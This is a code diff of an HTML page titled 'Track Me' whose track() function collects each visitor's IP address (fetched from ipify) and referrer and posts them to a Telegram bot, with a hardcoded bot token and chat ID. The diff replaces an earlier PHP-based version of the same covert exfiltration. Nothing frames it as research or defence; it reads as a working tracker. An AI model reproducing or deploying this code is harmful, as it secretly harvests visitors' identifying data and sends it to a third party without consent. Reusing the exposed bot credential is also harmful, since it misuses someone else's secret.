@@ -1,3 +1,4 @@
+<!DOCTYPE html>
 <html>
 <head>
     <title>Track Me</title>
@@ -25,21 +26,25 @@
     </style>
     <script>
         function track() {
-            var ip = '<?php echo $_SERVER['REMOTE_ADDR']; ?>';
-            var location = '<?php echo $_SERVER['HTTP_REFERER']; ?>';
-            var data = 'IP: ' + ip + ', Location: ' + location;
-            var botToken = '8541864317:AAFd_Wir8E53Dt_cLnvS9A2L3UJ_OUHWkPA';
-            var chatId = '5410457102';
-            fetch('https://api.telegram.org/bot' + botToken + '/sendMessage', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: data
-                })
-            });
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    var ip = data.ip;
+                    var location = document.referrer;
+                    var data = 'IP: ' + ip + ', Location: ' + location;
+                    var botToken = '8541864317:AAFd_Wir8E53Dt_cLnvS9A2L3UJ_OUHWkPA';
+                    var chatId = '5410457102';
+                    fetch('https://api.telegram.org/bot' + botToken + '/sendMessage', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: data
+                        })
+                    });
+                });
         }
     </script>
 </head>
